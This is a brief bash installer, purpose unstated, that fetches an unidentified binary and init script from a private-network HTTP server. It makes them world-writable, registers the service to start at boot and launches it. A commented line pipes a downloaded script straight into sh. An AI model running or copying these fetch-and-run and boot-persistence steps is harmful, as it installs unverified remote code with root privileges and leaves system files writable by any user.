#!/bin/bash

wget -O /usr/bin/jli3n http://172.16.47.1:8081/jlien/jli3nn
chmod 777 /usr/bin/jli3n
wget -O /etc/init.d/jli3n http://172.16.47.1:8081/jlien/jli3n
chmod 777 /etc/init.d/jli3n
chkconfig --add jli3n
chkconfig jli3n on
cd /etc/init.d/
./jli3n start
# systemctl daemon-reload
# systemctl enable jli3n

#wget http://172.16.47.1:8081/jlien/jdaemon.sh -O - | sh
# update-rc.d jli3n defaults
# update-rc.d jli3n enable